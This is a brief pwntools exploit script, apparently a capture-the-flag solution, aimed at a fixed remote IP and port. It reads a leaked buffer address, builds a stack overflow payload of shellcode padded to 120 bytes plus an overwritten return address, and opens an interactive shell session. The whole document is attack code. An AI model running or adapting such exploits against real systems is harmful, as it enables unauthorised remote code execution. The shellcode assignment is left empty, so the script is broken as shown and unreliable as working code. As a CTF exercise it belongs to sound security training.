
from pwn import *

host = "120.114.62.40"
port = 2115

context.arch = "amd64"
r = remote(host, port)
padding = 120

input_buf = int(r.readline().split(" ")[6], 16) 

shellcode = 
payload = shellcode.ljust(padding, "A") + p64(input_buf)

r.sendline(payload)

r.interactive()
